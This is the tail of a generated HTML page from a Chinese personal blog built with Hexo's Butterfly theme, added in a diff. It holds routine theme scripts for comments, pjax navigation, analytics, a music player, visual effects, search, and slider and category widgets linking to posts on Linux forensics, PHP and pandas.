+    else getScript('https://cdn.jsdelivr.net/npm/twikoo@1.6.31/dist/twikoo.all.min.js').then(init)
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = loadTwikoo
+  }
+})()</script></div><script src="/js/sun_moon.js" async></script><script async src="/js/jquery.js"></script><script async src="/styles/fish.js"></script><script defer src="/js/pace.min.js"></script><canvas async id="universe"></canvas><script defer src="/js/js.js"></script><script defer src="/js/emoji.js"></script><script async src="/js/pace.min.js"></script><script async src="/js/title.js"></script><script async data-pjax src="/js/anzhiyu.js"></script><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><link rel="stylesheet" href="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://lf26-cdn-tos.bytecdntp.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.js"></script><script src="https://npm.elemecdn.com/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener
+  btf.removeGlobalFnEvent('pjax')
+  btf.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div><!-- hexo injector body_end start --> <script data-pjax>if(document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
+    var parent = document.getElementById('recent-posts');
+    var child = '<div class="recent-post-item" style="width:100%;height: auto"><div id="catalog_magnet"><div class="magnet_item"><a class="magnet_link" href="http://blog.xchstudy.org/categories/网络安全/网络攻防/2-防御技术/电子取证/服务器取证/linux/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🍼 linux (28)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="http://blog.xchstudy.org/categories/网络安全/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🍉 网络安全 (158)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="http://blog.xchstudy.org/categories/计算机原理/编程语言/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🧀 编程语言 (43)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="http://blog.xchstudy.org/categories/计算机原理/编程语言/编程/编程语言/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🧀 编程语言 (36)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><a class="magnet_link_more"  href="http://blog.xchstudy.org/categories" style="flex:1;text-align: center;margin-bottom: 10px;">查看更多...</a></div></div>';
+    console.log('已挂载magnet')
+    parent.insertAdjacentHTML("afterbegin",child)}
+     </script><style>#catalog_magnet{flex-wrap: wrap;display: flex;width:100%;justify-content:space-between;padding: 10px 10px 0 10px;align-content: flex-start;}.magnet_item{flex-basis: calc(50% - 5px);background: #f2f2f2;margin-bottom: 10px;border-radius: 8px;transition: all 0.2s ease-in-out;}.magnet_item:hover{background: #b30070}.magnet_link_more{color:#555}.magnet_link{color:black}.magnet_link:hover{color:white}@media screen and (max-width: 600px) {.magnet_item {flex-basis: 100%;}}.magnet_link_context{display:flex;padding: 10px;font-size:16px;transition: all 0.2s ease-in-out;}.magnet_link_context:hover{padding: 10px 20px;}</style>
+    <style></style><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__bounceInLeft');
+    arr[i].setAttribute('data-wow-duration', '2s');
+    arr[i].setAttribute('data-wow-delay', '0.5s');
+    arr[i].setAttribute('data-wow-offset', '100');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__rotateInDownLeft');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '1s');
+    arr[i].setAttribute('data-wow-offset', '100');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer src="https://unpkg.com/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://unpkg.com/hexo-butterfly-wowjs/lib/wow_init.js"></script><script data-pjax>
+  function butterfly_swiper_injector_config(){
+    var parent_div_git = document.getElementById('recent-posts');
+    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/08/06/计算机原理/编程语言/编程/编程语言/php/php数据类型/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://pic.chenjichao.site/raw/12.webp" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-08-06</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/08/06/计算机原理/编程语言/编程/编程语言/php/php数据类型/&quot;);" href="javascript:void(0);" alt="">PHP 数据类型</a><div class="blog-slider__text">再怎么看我也不知道怎么描述它的啦！</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/08/06/计算机原理/编程语言/编程/编程语言/php/php数据类型/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/06/13/计算机原理/大数据技术/数据可视化/pandas/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://pic.chenjichao.site/raw/12.webp" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-06-13</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/06/13/计算机原理/大数据技术/数据可视化/pandas/&quot;);" href="javascript:void(0);" alt="">pandas</a><div class="blog-slider__text">再怎么看我也不知道怎么描述它的啦！</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/06/13/计算机原理/大数据技术/数据可视化/pandas/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/06/22/网络安全/网络攻防/2 防御技术/电子取证/服务器取证/linux/命令介绍/linux系统状态的查看/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://pic.chenjichao.site/raw/1.webp" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-06-22</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/06/22/网络安全/网络攻防/2 防御技术/电子取证/服务器取证/linux/命令介绍/linux系统状态的查看/&quot;);" href="javascript:void(0);" alt="">linux系统状态的查看</a><div class="blog-slider__text">再怎么看我也不知道怎么描述它的啦！</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/06/22/网络安全/网络攻防/2 防御技术/电子取证/服务器取证/linux/命令介绍/linux系统状态的查看/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/06/09/网络安全/网络攻防/2 防御技术/电子取证/服务器取证/linux/命令介绍/linux系统变量/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://pic.chenjichao.site/raw/4.webp" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-06-09</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/06/09/网络安全/网络攻防/2 防御技术/电子取证/服务器取证/linux/命令介绍/linux系统变量/&quot;);" href="javascript:void(0);" alt="">linux系统变量</a><div class="blog-slider__text">再怎么看我也不知道怎么描述它的啦！</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/06/09/网络安全/网络攻防/2 防御技术/电子取证/服务器取证/linux/命令介绍/linux系统变量/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/10/21/网络安全/网络攻防/2 防御技术/电子取证/服务器取证/linux/命令介绍/linux系统文件的查找/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://pic.chenjichao.site/raw/13.webp" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-10-21</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/10/21/网络安全/网络攻防/2 防御技术/电子取证/服务器取证/linux/命令介绍/linux系统文件的查找/&quot;);" href="javascript:void(0);" alt="">linux系统文件的查找</a><div class="blog-slider__text">再怎么看我也不知道怎么描述它的啦！</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/10/21/网络安全/网络攻防/2 防御技术/电子取证/服务器取证/linux/命令介绍/linux系统文件的查找/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/06/09/网络安全/网络攻防/2 防御技术/电子取证/服务器取证/linux/命令介绍/linux系统文件操作/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://pic.chenjichao.site/raw/11.webp" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-06-09</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/06/09/网络安全/网络攻防/2 防御技术/电子取证/服务器取证/linux/命令介绍/linux系统文件操作/&quot;);" href="javascript:void(0);" alt="">linux系统文件的查看与安装</a><div class="blog-slider__text">再怎么看我也不知道怎么描述它的啦！</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/06/09/网络安全/网络攻防/2 防御技术/电子取证/服务器取证/linux/命令介绍/linux系统文件操作/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" onclick="pjax.loadUrl(&quot;2024/06/09/网络安全/网络攻防/2 防御技术/电子取证/服务器取证/linux/命令介绍/linux服务进程/&quot;);" href="javascript:void(0);" alt=""><img width="48" height="48" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://pic.chenjichao.site/raw/12.webp" alt="" onerror="this.src=https://unpkg.zhimg.com/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2024-06-09</span><a class="blog-slider__title" onclick="pjax.loadUrl(&quot;2024/06/09/网络安全/网络攻防/2 防御技术/电子取证/服务器取证/linux/命令介绍/linux服务进程/&quot;);" href="javascript:void(0);" alt="">linux服务进程</a><div class="blog-slider__text">再怎么看我也不知道怎么描述它的啦！</div><a class="blog-slider__button" onclick="pjax.loadUrl(&quot;2024/06/09/网络安全/网络攻防/2 防御技术/电子取证/服务器取证/linux/命令介绍/linux服务进程/&quot;);" href="javascript:void(0);" alt="">详情       </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
+    console.log('已挂载butterfly_swiper')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_swiper_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_swiper_injector_config();
+  }
+  </script><script defer src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.js"></script><script defer data-pjax src="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper_init.js"></script><!-- hexo injector body_end end --></body></html>
